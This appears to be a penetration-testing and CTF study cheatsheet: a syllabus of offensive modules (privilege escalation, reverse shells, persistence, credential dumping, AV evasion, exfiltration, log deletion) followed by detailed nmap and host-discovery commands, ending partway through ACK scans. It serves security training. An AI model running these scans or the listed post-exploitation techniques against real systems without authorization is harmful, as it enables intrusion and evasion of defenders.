# Syllabus

## Comprehensive Modular Cheatsheet

---

## MODULE 1: RECONNAISSANCE & HOST DISCOVERY

### 1.1 Network Scanning & Host Discovery

- ARP scanning (arp-scan, netdiscover)
- ICMP ping sweeps (fping, nmap ping scan)
- Reverse DNS lookups (nslookup, dig)
- Subnet enumeration (ipcalc, sipcalc)
- IPv6 discovery (nmap -6, ping6)

### 1.2 Service Discovery & Port Scanning

- TCP connect scans (nmap -sT)
- TCP SYN stealth scans (nmap -sS)
- UDP scans (nmap -sU)
- ACK scans (nmap -sA)
- FIN/NULL/Xmas scans (nmap -sF, -sN, -sX)
- Idle/Zombie scans (nmap -sI)
- Port range specification (common, specific, all ports)
- Timing templates (paranoid, sneaky, polite, normal, aggressive, insane)
- Service version detection (nmap -sV)
- OS fingerprinting (nmap -O)

### 1.3 Advanced Nmap Techniques

- Script scanning (nmap -sC, --script category)
- NSE (Nmap Scripting Engine) categories (default, discovery, safe, intrusive, vuln)
- Custom script arguments (--script-args)
- Output formats (-oN, -oX, -oG, -oA)
- Fragmentation & decoy (nmap -f, -D)

---

## MODULE 2: PORT & SERVICE ENUMERATION

### 2.1 Web Service Enumeration (HTTP/HTTPS)

- Banner grabbing (telnet, nc, curl -v, nmap -sV)
- Directory enumeration (dirbuster, gobuster, ffuf, wfuzz)
- Virtual host enumeration (gobuster vhost, ffuf, sublist3r)
- Subdomain discovery (nslookup, dig, amass, subfinder)
- Web server identification (httprint, curl, Wappalyzer)
- SSL/TLS certificate analysis (openssl s_client, sslscan, testssl.sh)
- HTTP methods enumeration (OPTIONS, TRACE, HEAD)

### 2.2 SSH Enumeration

- SSH version detection (nmap -sV, ssh -v)
- SSH key types and algorithms
- Timing and auth attempts
- Server banner information

### 2.3 FTP/SFTP Enumeration

- Anonymous login attempts
- Version detection
- Banner grabbing
- Directory listing permissions

### 2.4 SMB/NetBIOS Enumeration

- nmap -p 445 (SMB)
- nmap -p 139 (NetBIOS)
- enum4linux
- smbclient
- smbmap
- nbtstat enumeration
- Share enumeration and permissions

### 2.5 LDAP Enumeration

- ldapsearch
- LDAP injection testing
- Anonymous binding
- Schema enumeration

### 2.6 DNS Enumeration

- dig (axfr, any, specific records)
- nslookup (interactive mode)
- dnsenum
- dnsmap
- fierce
- DNSSEC analysis
- DNS zone transfers

### 2.7 SNMP Enumeration

- snmp-check
- onesixtyone
- snmpwalk
- Community strings (public, private, manager)
- OID enumeration

### 2.8 Database Service Enumeration

- MySQL/MariaDB (port 3306)
- PostgreSQL (port 5432)
- MSSQL (port 1433)
- Oracle (port 1521)
- MongoDB (port 27017)
- Redis (port 6379)
- Cassandra (port 9042)

### 2.9 RPC & Remote Service Enumeration

- rpcinfo
- rpcclient
- impacket tools
- Kerberos enumeration (kerbrute, GetNPUsers.py)

---

## MODULE 3: VULNERABILITY DETECTION & ASSESSMENT

### 3.1 Active Vulnerability Scanning

- Nessus integration
- OpenVAS
- Qualys integration
- Rapid7 InsightVM
- Custom Nmap NSE scripts for CVEs

### 3.2 Web Vulnerability Assessment

- SQLi detection (manual, sqlmap)
- XSS detection (manual, automated scanners)
- CSRF detection
- XXE detection
- Path traversal detection
- File inclusion (LFI/RFI)
- Command injection detection
- Template injection detection
- SSRF detection
- Insecure deserialization detection

### 3.3 Manual Vulnerability Research

- CVE databases (cve.mitre.org, nvd.nist.gov, exploit-db)
- Service-specific exploit research
- Version-specific vulnerabilities
- Default credentials databases
- Known public exploits searching

### 3.4 Configuration Weakness Detection

- Weak/default credentials
- Unnecessary services running
- Insecure permissions
- Outdated/unpatched services
- Misconfigured protocols
- Weak encryption settings

### 3.5 Authentication Mechanism Analysis

- Password policy weaknesses
- MFA bypass possibilities
- Session management flaws
- Token vulnerabilities

---

## MODULE 4: EXPLOITATION FRAMEWORKS & TOOLS

### 4.1 Metasploit Framework (MSF)

- msfconsole basics
- Module types (exploit, payload, auxiliary, post, encoder)
- Search and selection (search, use, show options)
- Payload generation and customization
- Exploit execution and session handling
- Multi/handler for reverse shells
- Staged vs unstaged payloads
- Encoder chains for AV evasion

### 4.2 Custom Exploitation

- Python exploit development
- Bash scripting for exploitation
- Perl exploitation scripts
- Ruby-based exploits

### 4.3 Exploitation Automation

- Exploit chains
- Multi-stage exploitation
- Conditional exploitation paths

---

## MODULE 5: LINUX EXPLOITATION

### 5.1 Information Gathering (Post-Access)

- System enumeration (uname, cat /proc/version, lsb_release)
- Kernel version identification
- Running processes (ps aux)
- Network connections (netstat, ss)
- Users and groups (cat /etc/passwd, /etc/shadow, id, groups)
- Sudo permissions (sudo -l)
- Cron jobs (crontab -l, /etc/cron*)
- SSH keys (find ~/.ssh)
- Writable directories
- SUID/SGID binaries
- Capabilities (getcap)

### 5.2 Linux Privilege Escalation Vectors

- Kernel exploits (searchsploit, exploit-db)
- SUID binary exploitation
- Writable /etc/passwd or /etc/shadow
- Sudo misconfiguration (NOPASSWD, command wildcards)
- Cron job abuse (writable scripts)
- PATH variable manipulation
- Library hijacking (LD_PRELOAD, LD_LIBRARY_PATH)
- Weak file permissions
- Capabilities exploitation
- Docker escape
- Namespace escape

### 5.3 Linux Privilege Escalation Tools

- linpeas.sh
- linenum.sh
- linux-smart-enumeration
- pspy (process spying)
- GTFO Bins (privilege escalation techniques)

### 5.4 Reverse Shell Techniques (Linux)

- Bash reverse shells
- NC (netcat/nc/ncat) shells
- Python reverse shells
- Perl reverse shells
- Ruby reverse shells
- PHP reverse shells
- Java reverse shells
- Shell encoding and obfuscation

### 5.5 Maintaining Access (Linux)

- SSH key persistence
- Cron job backdoors
- Systemd service persistence
- /etc/profile.d manipulation
- Bash RC file modification
- sudo command wrapper
- Rootkit installation

---

## MODULE 6: WINDOWS EXPLOITATION

### 6.1 Information Gathering (Post-Access)

- System info (systeminfo, Get-ComputerInfo)
- Network configuration (ipconfig, Get-NetAdapter)
- Installed patches (wmic qfe, Get-Hotfix)
- User enumeration (whoami, net user, Get-LocalUser)
- Group membership (net localgroup, Get-LocalGroupMember)
- Running processes (tasklist, Get-Process)
- Services (sc query, Get-Service)
- Scheduled tasks (tasklist /v, Get-ScheduledTask)
- PowerShell version and execution policy (Get-ExecutionPolicy)
- Recently accessed files
- Windows Defender status

### 6.2 Windows Privilege Escalation Vectors

- Kernel exploits (Windows-specific CVEs)
- UAC bypass techniques
- Token impersonation
- Weak service permissions
- Unquoted service paths
- Writable registry keys
- DLL injection
- Group Policy Preferences (GPP)
- Scheduled task abuse
- Service account exploitation
- Weak file/folder permissions
- SeImpersonate token (Potato exploits)
- SeAssignPrimaryToken vulnerability

### 6.3 Windows Privilege Escalation Tools

- Sherlock (PowerShell)
- JAWS (PowerShell)
- PrivEsc (PowerShell)
- WinPEAS (.NET/batch)
- Windows Exploit Suggester
- Metasploit payload encoding
- mimikatz (credential dumping)

### 6.4 Active Directory Exploitation

- Domain enumeration (Get-ADUser, Get-ADComputer, Get-ADGroup)
- Bloodhound analysis
- Kerberoasting (Invoke-Kerberoast)
- AS-REP Roasting (GetNPUsers.py)
- Pass-the-Hash (impacket, Mimikatz)
- Pass-the-Ticket
- Overpass-the-Hash
- DCSync attacks
- Lateral movement within domain
- Golden Ticket creation
- Silver Ticket creation
- Delegation abuse (constrained/unconstrained)

### 6.5 Windows Credential Access

- Mimikatz (sekurlsa::logonpasswords)
- Credential dumping from LSASS
- Registry SAM/SYSTEM extraction
- Cached credential extraction
- Kerberos ticket extraction
- WDigest attacks
- NTLM relay attacks

### 6.6 Reverse Shell Techniques (Windows)

- cmd.exe reverse shells
- PowerShell reverse shells
- msfvenom Windows payloads (exe, dll, msi)
- Batch script shells
- VBScript shells
- WSH shells
- COM object shells
- Living-off-the-land techniques

### 6.7 Maintaining Access (Windows)

- Scheduled task persistence
- Registry RUN keys (HKLM/HKCU)
- Startup folder persistence
- Service installation
- WMI event subscription
- Scheduled job persistence (Task Scheduler)
- Logon script persistence
- COM registry objects
- Windows Defender exclusion
- Firewall rule exceptions

### 6.8 Windows Post-Exploitation

- Pass-the-Hash attacks
- Pivoting through Windows networks
- Windows Defender/AV evasion
- Event log manipulation/deletion
- UAC bypasses (various methods)
- PowerShell Constrained Language bypass
- Execution policy bypass

---

## MODULE 7: CUSTOM APPLICATION EXPLOITATION

### 7.1 Source Code Analysis for Vulnerabilities

- Static analysis (manual code review)
- SAST tools (SonarQube, Checkmarx, Fortify)
- Code compilation analysis
- Dependency vulnerability scanning (npm audit, pip check, OWASP Dependency-Check)

### 7.2 Binary Analysis & Reverse Engineering

- File type identification (file command)
- Strings extraction (strings command)
- Disassembly (IDA Pro, Ghidra, radare2, objdump)
- Debugging (gdb, lldb, Immunity Debugger, x64dbg)
- Stack analysis
- Heap analysis
- Function calls and imports

### 7.3 Memory Corruption Exploitation

- Buffer overflow detection
- Stack-based overflow exploitation
- Heap-based overflow exploitation
- Use-after-free exploitation
- Double-free exploitation
- Integer overflow exploitation
- Format string vulnerabilities
- ROP (Return-Oriented Programming) gadget chains
- ASLR bypass techniques
- DEP/NX bypass techniques
- SMASH the Stack techniques

### 7.4 Logic-Based Vulnerabilities

- Race condition exploitation
- Timing attacks
- Business logic bypass
- State machine errors
- Authorization bypass
- Access control circumvention

### 7.5 Cryptographic Weaknesses

- Weak encryption algorithms
- Poor key management
- Insufficient randomness
- Cryptographic implementation flaws

---

## MODULE 8: WEB APPLICATION EXPLOITATION

### 8.1 Injection Attacks

- SQL Injection (MySQL, MSSQL, Oracle, PostgreSQL specifics)
    - Boolean-based blind SQLi
    - Time-based blind SQLi
    - Union-based SQLi
    - Error-based SQLi
    - Stacked queries
- OS Command Injection
- LDAP Injection
- XML/XPath Injection
- Template Injection (Jinja2, Twig, etc.)
- Expression Language Injection
- Code Injection

### 8.2 Authentication & Session Management

- Brute force attacks (hydra, medusa, custom scripts)
- Dictionary attacks
- Credential stuffing
- Session fixation
- Session prediction
- Cookie manipulation
- Session timeout bypass
- Concurrent session abuse

### 8.3 Authorization & Access Control

- Broken access control exploitation
- Horizontal privilege escalation
- Vertical privilege escalation
- IDOR (Insecure Direct Object References)
- Function-level access control bypass
- Forced browsing
- Privilege confusion

### 8.4 Client-Side Vulnerabilities

- Reflected XSS exploitation
- Stored XSS exploitation
- DOM-based XSS
- CSRF exploitation
- Clickjacking
- Open Redirect
- Client-side template injection

### 8.5 API-Specific Exploitation

- REST API enumeration
- GraphQL introspection
- SOAP/XML-RPC exploration
- API authentication bypass
- Rate limiting bypass
- API version abuse
- Hidden/undocumented endpoints
- WebSocket exploitation

### 8.6 File Upload Exploitation

- Arbitrary file upload
- Unrestricted file upload
- File extension bypass
- MIME type bypass
- Polyglot file exploitation
- XXE via file upload
- RCE via file upload
- Path traversal via filename

### 8.7 Deserialization Attacks

- PHP object injection
- Java serialization gadget chains (ysoserial)
- Python pickle exploitation
- .NET deserialization
- Ruby marshalling exploitation

### 8.8 Server-Side Request Forgery (SSRF)

- Internal network scanning via SSRF
- Cloud metadata endpoint access
- Local service exploitation
- File protocol exploitation
- SSRF to RCE chains

### 8.9 Business Logic Exploitation

- Payment process bypass
- Pricing manipulation
- Workflow manipulation
- Multi-step process bypass
- Race condition in critical operations

### 8.10 Web Framework Exploitation

- Express.js specific vulnerabilities
- Django specific vulnerabilities
- Laravel specific vulnerabilities
- ASP.NET specific vulnerabilities
- Spring Boot specific vulnerabilities

---

## MODULE 9: NETWORK SERVICE EXPLOITATION

### 9.1 SSH Exploitation

- Brute force SSH (hydra, medusa)
- SSH key enumeration
- SSH version vulnerabilities
- SSH agent forwarding abuse
- Kerberos SSH exploitation
- SSH tunneling/forwarding for pivoting

### 9.2 FTP Exploitation

- Anonymous FTP access
- Brute force FTP
- FTP bounce attacks
- Weak permissions abuse
- Default credentials
- FTP misconfiguration

### 9.3 SMB/CIFS Exploitation

- Null session exploitation
- Shares enumeration and access
- SMB relay attacks (impacket, responder)
- Pass-the-Hash over SMB
- Eternal Blue exploitation (MS17-010)
- Dictionary/Brute force SMB
- SMB version vulnerabilities
- NTLM exploitation

### 9.4 RDP Exploitation

- RDP brute force
- RDP credential relaying
- BlueKeep exploitation
- CVE-specific RDP vulnerabilities
- Session hijacking
- Clipboard data theft

### 9.5 VNC Exploitation

- VNC brute force
- VNC weak encryption
- VNC buffer overflows
- VNC authentication bypass

### 9.6 Telnet Exploitation

- Telnet credential theft (plaintext)
- Telnet brute force
- Telnet service vulnerabilities
- Telnet default credentials

### 9.7 SMTP Exploitation

- Open relay exploitation
- Mail spoofing
- VRFY/EXPN enumeration
- SMTP injection
- Default credentials

### 9.8 POP3/IMAP Exploitation

- Brute force POP3/IMAP
- Cleartext credential capture
- CRAM-MD5 weaknesses
- Default credentials

### 9.9 DNS Exploitation

- Zone transfer exploitation
- DNS poisoning
- DNS cache poisoning
- DNSSEC bypass
- DNS amplification for DDoS

### 9.10 SNMP Exploitation

- Community string brute force
- MIB enumeration
- SNMP set command abuse
- Default SNMP credentials
- Information disclosure via SNMP

### 9.11 NTP Exploitation

- NTP amplification DDoS
- NTP information disclosure
- NTP authentication bypass

---

## MODULE 10: DATABASE EXPLOITATION

### 10.1 MySQL/MariaDB Exploitation

- Brute force MySQL
- Default credentials
- File read/write (INTO OUTFILE)
- User-defined function (UDF) loading
- SQL injection in MySQL context
- Privilege escalation within MySQL
- Data exfiltration techniques

### 10.2 PostgreSQL Exploitation

- Brute force PostgreSQL
- Default credentials
- Copy to/from file exploitation
- PL/Python/Shell code execution
- SQL injection in PostgreSQL context
- Superuser exploitation
- Extension loading for code execution

### 10.3 MSSQL Exploitation

- Brute force MSSQL
- Default credentials (SA account)
- xp_cmdshell activation
- CLR assembly loading for RCE
- SQL injection in MSSQL context
- Linked server exploitation
- Impersonation abuse

### 10.4 Oracle Database Exploitation

- Brute force Oracle
- Default credentials (system/sys)
- SQL injection in Oracle context
- Java code execution
- External table exploitation
- UTL_FILE exploitation
- Directory privileges abuse

### 10.5 NoSQL Injection

- MongoDB injection ($where, $ne, $gt)
- Injection automation (noSQLMap)
- JSON injection
- JavaScript injection in NoSQL

### 10.6 Redis Exploitation

- Unauthenticated Redis access
- Redis command injection
- Module loading for RCE
- EVAL script execution
- Master-slave replication abuse
- Persistence file manipulation

### 10.7 MongoDB Exploitation

- Unauthenticated MongoDB access
- Query operator injection
- JavaScript code execution
- Admin credential theft
- Data exfiltration

### 10.8 Cassandra Exploitation

- Unauthenticated Cassandra access
- Query manipulation
- Default credentials
- Information disclosure

---

## MODULE 11: SOCIAL ENGINEERING & CLIENT-SIDE ATTACKS

### 11.1 Credential Harvesting

- Fake login pages
- Phishing email generation
- Credential interception
- Man-in-the-middle attacks

### 11.2 Payload Delivery

- Malicious document generation (macro, embedded objects)
- Executable wrapping
- Living-off-the-land techniques
- Browser exploitation
- Plugin vulnerabilities (Java, Flash)

### 11.3 Physical Security

- Social engineering reconnaissance
- Badge cloning
- Lock picking techniques
- Dumpster diving targets
- USB drop attacks
- Wireless network interception

---

## MODULE 12: POST-EXPLOITATION & LATERAL MOVEMENT

### 12.1 Persistence Mechanisms

- Scheduled task persistence (Windows/Linux)
- Backdoor accounts
- Web shell installation
- SSH key persistence
- Rootkit installation
- Firmware modifications
- Bootkit installation

### 12.2 Lateral Movement

- Pivot techniques
- Proxy tunneling
- VPN access establishment
- Trust relationship abuse
- Domain trust exploitation
- Network bridge creation

### 12.3 Privilege Escalation Chains

- Combining multiple vulnerabilities
- Chaining kernel exploits
- Windows token chaining
- Linux capability chaining
- Domain-to-local exploitation

### 12.4 Data Exfiltration

- Compression techniques (tar, zip, rar)
- Encryption before exfil
- Slow/stealth exfiltration (DNS, ICMP, HTTP)
- Data encoding for transit
- Splitting large files
- Timing awareness

### 12.5 Covering Tracks

- Log deletion (Windows Event Logs, syslog)
- Log manipulation
- File timestamp manipulation
- Registry cleanup (Windows)
- Bash history removal
- Browser history cleanup

---

## MODULE 13: EVASION & OBFUSCATION

### 13.1 AV/EDR Evasion

- Encoder chains (MSF)
- Packing and encryption
- Code obfuscation
- Living-off-the-land binaries (LOLBins/Lolbas)
- Process hollowing
- DLL injection for hiding
- Memory-only malware

### 13.2 Firewall & IDS/IPS Evasion

- Fragmentation
- Protocol anomalies
- Slow scanning
- Decoy traffic
- Tunnel creation
- Encryption of payloads

### 13.3 Behavioral Analysis Evasion

- Timing delays in exploitation
- Virtual machine detection and bypass
- Analyst tool detection and bypass
- Sandbox escape techniques

---

## MODULE 14: SCRIPTING & AUTOMATION

### 14.1 Python Exploitation Scripts

- Socket programming (TCP/UDP)
- HTTP requests (requests library)
- Paramiko for SSH
- Subprocess execution
- Regular expression matching
- Parsing and data extraction

### 14.2 Bash Exploitation Scripts

- Loops and conditionals
- Grep, sed, awk for parsing
- Netcat usage
- SSH automation
- Cron scheduling

### 14.3 Perl Exploitation

- Network socket operations
- Regex for data parsing
- File I/O operations
- System integration

### 14.4 Ruby Exploitation

- Metasploit module development
- HTTP libraries
- System command execution
- File operations

---

## MODULE 15: CAPTURE THE FLAG (CTF) STRATEGIES

### 15.1 CTF Reconnaissance Phase

- Thorough host enumeration
- Service identification
- Vulnerability cataloging
- Attack surface mapping

### 15.2 CTF Exploitation Phase

- Prioritization of exploits
- Staged exploitation approach
- Multiple exploitation vectors
- Time management

### 15.3 CTF Documentation & Flag Submission

- Flag format recognition
- Token submission procedures
- Write-up documentation
- Lessons learned capture

---

## MODULE 16: TOOL MASTERY REFERENCE

### Essential Kali Linux Tools by Function

- **Scanning**: nmap, masscan, zmap
- **Enumeration**: enum4linux, smbmap, ldapsearch, nikto
- **Web Testing**: burp suite, OWASP ZAP, sqlmap, wfuzz, gobuster
- **Exploitation**: Metasploit, searchsploit, custom scripts
- **Post-Exploitation**: linpeas, winpeas, mimikatz, impacket
- **Reverse Engineering**: radare2, Ghidra, gdb, objdump
- **Privilege Escalation**: GTFOBins, PEASS, Sherlock
- **Credential Attacks**: hashcat, john, hydra, medusa
- **Packet Analysis**: Wireshark, tcpdump, tshark
- **Tunneling/Pivoting**: socat, chisel, SSH, proxychains

---

## QUICK REFERENCE: OS-SPECIFIC EXPLOITATION FLOWS

### Linux Exploitation Flow

1. Information gathering (uname, ps, id, sudo -l)
2. Vulnerability identification (searchsploit, GTFOBins, capabilities)
3. Exploit selection and customization
4. Privilege escalation execution
5. Persistence installation
6. Data exfiltration
7. Track covering

### Windows Exploitation Flow

1. System enumeration (systeminfo, Get-ExecutionPolicy)
2. Patch level assessment
3. Service/task enumeration
4. UAC/token analysis
5. Privilege escalation attempt
6. Domain enumeration (if domain-joined)
7. Credential harvesting (mimikatz)
8. Lateral movement setup
9. Persistence mechanism installation
10. Cleanup/track covering

### Web Application Exploitation Flow

1. Service enumeration (ports, versions, frameworks)
2. Vulnerability scanning (automated + manual)
3. Injection point identification
4. Payload crafting and testing
5. Exploitation for RCE/shell
6. Post-exploitation from web shell
7. System-level exploitation for privilege escalation

---

## OS-SPECIFIC TOOLS & TECHNIQUES SUMMARY

| Task                     | Linux                         | Windows                                           | Web                                               |
| ------------------------ | ----------------------------- | ------------------------------------------------- | ------------------------------------------------- |
| **Privilege Escalation** | Kernel exploits, SUID, Sudo   | UAC bypass, Token impersonation, Weak permissions | SQL injection, File upload, Authentication bypass |
| **Persistence**          | Cron, SSH keys, RC files      | Registry, Scheduled tasks, WMI                    | Web shells, Backdoor accounts                     |
| **Credential Dumping**   | /etc/shadow access, SSH keys  | Mimikatz, SAM registry, LSASS dump                | Database queries, File access                     |
| **Lateral Movement**     | SSH, NFS, Shared secrets      | WinRM, RDP, Pass-the-Hash                         | SQL injection pivot, API abuse                    |
| **Post-Exploitation**    | Shell stabilization, Backdoor | Golden ticket, Lateral movement                   | Persistence installation, Data theft              |

---

## CRITICAL THINKING CHECKLIST

- [ ] Have all open ports been enumerated?
- [ ] Have all service versions been identified?
- [ ] Have default credentials been tested?
- [ ] Have known CVEs for identified versions been researched?
- [ ] Have common misconfigurations been checked?
- [ ] Have weak permissions been analyzed?
- [ ] Have trust relationships been exploited (domain, systems)?
- [ ] Have multiple privilege escalation vectors been attempted?
- [ ] Has persistence been established?
- [ ] Have tracks been covered?

---

# RECONNAISSANCE & HOST DISCOVERY

## Network Scanning & Host Discovery

### ARP Scanning

**arp-scan** is the primary tool for Layer 2 ARP-based host discovery, most effective on local network segments where ARP packets can propagate.

Basic host discovery across a subnet:

```bash
arp-scan -l
```

This automatically detects your network interface and scans the local subnet. For explicit subnet specification:

```bash
arp-scan 192.168.1.0/24
```

To scan a specific range without CIDR notation:

```bash
arp-scan -r 192.168.1.1-192.168.1.254
```

Output interpretation includes MAC addresses and manufacturer identification. Increase verbosity to see all ARP responses including duplicates:

```bash
arp-scan -v 192.168.1.0/24
```

**netdiscover** provides interactive ARP scanning with real-time display updates. Passive mode discovers hosts through observation without active scanning:

```bash
netdiscover -p
```

Active mode with CIDR specification:

```bash
netdiscover -r 192.168.1.0/24
```

Specify a particular interface:

```bash
netdiscover -i eth0 -r 192.168.1.0/24
```

netdiscover's interactive output allows immediate identification of newly appearing hosts. The `-s` parameter sets scan speed (millisecond delay between packets), useful when network congestion requires slower scanning:

```bash
netdiscover -r 192.168.1.0/24 -s 1000
```

### ICMP Ping Sweeps

**fping** performs parallel ICMP echo requests, significantly faster than sequential ping attempts. It returns both responding and non-responding hosts:

```bash
fping -a 192.168.1.0/24
```

The `-a` flag shows only alive hosts; omit it for complete results including non-responsive addresses. For multiple CIDR ranges:

```bash
fping -a 192.168.1.0/24 192.168.2.0/24
```

Process a file containing target ranges:

```bash
fping -a -f targets.txt
```

Increase ICMP retry attempts for unreliable networks:

```bash
fping -r 3 -a 192.168.1.0/24
```

Generate output in multiple formats. Grep-friendly output:

```bash
fping -a 192.168.1.0/24 2>&1 | grep alive
```

**nmap ping scan** provides more control and integrates scanning into a comprehensive enumeration workflow. Basic ICMP echo sweep:

```bash
nmap -PE 192.168.1.0/24
```

The `-PE` flag sends ICMP echo requests. `-PP` sends timestamp requests (sometimes passes firewall filters), and `-PM` sends address mask requests. Combined multi-method ping:

```bash
nmap -PE -PP -PM -sn 192.168.1.0/24
```

Disable all ping types (useful when ICMP is blocked) and proceed with port scanning anyway:

```bash
nmap -Pn 192.168.1.0/24 -p 22,80,443
```

Use TCP SYN ping for ICMP-filtered networks:

```bash
nmap -PS 192.168.1.0/24 -p 22,80,443
```

This sends TCP SYN packets to specified ports (defaulting to common services) and treats responses as host presence indicators. UDP ping:

```bash
nmap -PU 192.168.1.0/24
```

Combine multiple probe types with explicit timing template:

```bash
nmap -PE -PS22,80,443 -PU -T4 192.168.1.0/24
```

### Reverse DNS Lookups

**nslookup** performs forward and reverse DNS queries. Basic reverse lookup given an IP:

```bash
nslookup 192.168.1.100
```

Specify a particular DNS server:

```bash
nslookup 192.168.1.100 8.8.8.8
```

Interactive mode for multiple queries:

```bash
nslookup
> server 8.8.8.8
> set type=PTR
> 100.1.168.192.in-addr.arpa
> exit
```

Note the reversed octet order for in-addr.arpa queries (standard for reverse DNS).

**dig** provides more detailed DNS information with better formatting for scripting. Reverse lookup:

```bash
dig -x 192.168.1.100
```

Specify nameserver:

```bash
dig -x 192.168.1.100 @8.8.8.8
```

Batch reverse lookups from a file:

```bash
while read ip; do dig +short -x "$ip"; done < ips.txt
```

Include full DNSSEC validation details:

```bash
dig -x 192.168.1.100 +dnssec +multiline
```

Query specific record types:

```bash
dig @8.8.8.8 example.com MX
dig @8.8.8.8 example.com NS
```

### Subnet Enumeration

**ipcalc** computes subnet information from CIDR notation or address/netmask pairs:

```bash
ipcalc 192.168.1.0/24
```

Output includes network address, broadcast address, usable host range, and total number of hosts. For non-standard netmasks:

```bash
ipcalc 192.168.1.100 255.255.255.0
```

Alternative notation with hyphenated range:

```bash
ipcalc 192.168.1.1-192.168.1.254
```

Split a larger subnet into smaller subnets:

```bash
ipcalc -s 26 192.168.0.0/24
```

This divides the /24 into /26 subnets, each containing 62 usable hosts.

**sipcalc** provides similar functionality with additional IPv6 support and more detailed output options:

```bash
sipcalc 192.168.1.0/24
```

Analyze multiple subnets simultaneously:

```bash
sipcalc 192.168.1.0/24 192.168.2.0/24
```

Display CIDR to netmask conversion:

```bash
sipcalc -c 192.168.1.0/24
```

### IPv6 Discovery

**nmap** with IPv6 support:

```bash
nmap -6 fe80::1
```

Full subnet IPv6 scanning (note: IPv6 uses /64 subnets primarily in local scope):

```bash
nmap -6 2001:db8::/32 -sn
```

[Speculation] IPv6 scanning is often less monitored than IPv4, potentially creating blind spots in defensive monitoring.

Combine IPv6 with port scanning:

```bash
nmap -6 -p 22,80,443 2001:db8::1
```

**ping6** performs ICMPv6 echo requests:

```bash
ping6 fe80::1%eth0
```

The `%eth0` notation specifies the interface for link-local addresses (fe80::/10), which are essential for local IPv6 discovery.

Ping6 multicast discovery (pings all IPv6 nodes on local link):

```bash
ping6 ff02::1%eth0
```

Scope identification for IPv6 address ranges:

- `fe80::/10` = link-local (requires interface specification)
- `fc00::/7` = unique local (analogous to RFC 1918 private ranges)
- `2001:db8::/32` = documentation prefix (reserved for examples)

Perform solicitation to discover IPv6 addresses without active scanning:

```bash
nmap -6 -sn --script=targets-ipv6-mld fe80::1%eth0
```

[Inference] Link-local IPv6 addresses always use the fe80::/10 prefix, making them predictable for targeted discovery compared to global unicast addresses.

Related topics for expanded coverage: Port scanning methodologies (TCP/UDP scanning, timing templates), Service version detection (-sV flag), Firewall evasion techniques, and DNS enumeration for comprehensive host discovery.

---

## Service Discovery & Port Scanning

### TCP Connect Scans

TCP connect scans (`nmap -sT`) establish complete three-way handshakes to determine port status. This is the default scan type when SYN scans are unavailable or when running without elevated privileges.

**Basic syntax:**

```bash
nmap -sT <target>
```

**Common parameters and variations:**

- `-sT -p 22,80,443` — Scan specific ports only
- `-sT -p 1-65535` — Full port range scan
- `-sT -Pn` — Skip ping discovery, scan all hosts assumed alive
- `-sT -r` — Sequential port scanning instead of random
- `-sT --reason` — Show why ports are marked as open/closed

**How it works:** Nmap completes the entire TCP three-way handshake (SYN → SYN-ACK → ACK) for each port. An open port completes the handshake; closed ports send RST. This generates complete logs in system audit trails and is easily detected by IDS/IPS systems.

**Context-specific applications:**

- **Limited privileges scenario:** Use when running as unprivileged user (no raw socket access)
- **Network logging:** Generates full connection records in firewall/IDS logs
- **Reliability:** More reliable on unstable networks than stealth variants
- **Windows targeting:** Often necessary when scanning Windows systems with restrictive firewall policies

**Example CTF scenario:**

```bash
nmap -sT -p 22,80,443,3306,5432 192.168.1.100 -v
```

Explicitly scans database ports commonly left open in vulnerable CTF environments.

---

### TCP SYN Stealth Scans

TCP SYN scans (`nmap -sS`) send SYN packets and evaluate RST/SYN-ACK responses without completing handshakes. Requires raw socket privileges (typically root/administrator).

**Basic syntax:**

```bash
nmap -sS <target>
```

**Common parameters and variations:**

- `-sS -p-` — Scan all 65535 ports (dash after -p means all ports)
- `-sS --top-ports 1000` — Scan only the 1000 most common ports
- `-sS -F` — Fast scan (100 most common ports)
- `-sS --max-rate 5000` — Limit scan rate to 5000 packets/second
- `-sS --min-rate 100` — Minimum 100 packets/second for slow networks
- `-sS -sV` — Combine with service version detection

**How it works:** Nmap sends SYN packets. Open ports respond with SYN-ACK; nmap sends RST to abort without completing the connection. Closed ports respond with RST. The key advantage is that no complete connection is established, leaving minimal or no connection records.

**Context-specific applications:**

- **Evasion:** Generates fewer logs than connect scans; some intrusion detection systems miss incomplete connections
- **Speed:** Significantly faster than connect scans for large port ranges
- **Privilege requirement:** Requires `sudo` on Linux or administrator on Windows
- **Firewall detection:** Modern firewalls detect incomplete connection patterns just as effectively as complete connections

**Example CTF scenario:**

```bash
sudo nmap -sS -p 1-10000 --max-rate 2000 192.168.1.0/24 -oN scan_results.txt
```

Rapid reconnaissance of a subnet while logging results for analysis.

---

### UDP Scans

UDP scans (`nmap -sU`) probe connectionless UDP services by sending UDP packets and monitoring for ICMP unreachable responses or UDP responses.

**Basic syntax:**

```bash
nmap -sU <target>
```

**Common parameters and variations:**

- `-sU -p 53,123,161,162,389,500` — Scan common UDP services (DNS, NTP, SNMP, LDAP, IPsec)
- `-sU --top-ports 100` — Top 100 UDP ports
- `-sU -p 1-65535` — Full UDP port range (very slow; not recommended in CTF)
- `-sU -sV` — Combine with version detection
- `-sU --max-retries 1` — Reduce retransmission attempts for speed
- `-sU -Pn` — Assume host is alive (skip ping)

**How it works:** Nmap sends UDP packets to target ports. If a service responds, the port is open. If ICMP port unreachable is returned, the port is closed. If no response is received after retries, the port is marked as open|filtered (uncertain state).

**Challenges:**

- **No connection handshake:** Cannot definitively determine if a port is open or if it's just being filtered
- **Rate limiting:** Many systems rate-limit ICMP responses, causing inaccurate results
- **Speed:** Significantly slower than TCP scans due to timeout periods
- **Common false positives:** UDP ports often appear open|filtered when they're actually closed

**Context-specific applications:**

- **DNS reconnaissance:** Port 53 UDP for zone transfers or service enumeration
- **SNMP probing:** Port 161 for network device information gathering
- **NTP enumeration:** Port 123 for time server fingerprinting
- **VPN/IPsec detection:** Port 500 UDP for key exchange protocols

**Example CTF scenario:**

```bash
nmap -sU -p 53,123,161,389,500 --max-retries 1 10.0.0.0/24 -v
```

Target common UDP services without consuming excessive time on timeout periods.

---

### ACK Scans

ACK scans (`nmap -sA`) send TCP ACK packets to determine firewall filtering rules rather than directly identify open ports. Unfiltered ports respond with RST; filtered ports don't respond or respond with ICMP unreachable.

**Basic syntax:**

```bash
nmap -sA <target>
```

**Common parameters and variations:**

- `-sA -p 22,80,443` — Probe specific ports for filtering status
- `-sA -p-` — Full port range (rarely necessary for ACK scans)
- `-sA -F` — Fast scan on 100 most common ports
- `-sA -T4` — Aggressive timing (speeds up timeout detection)

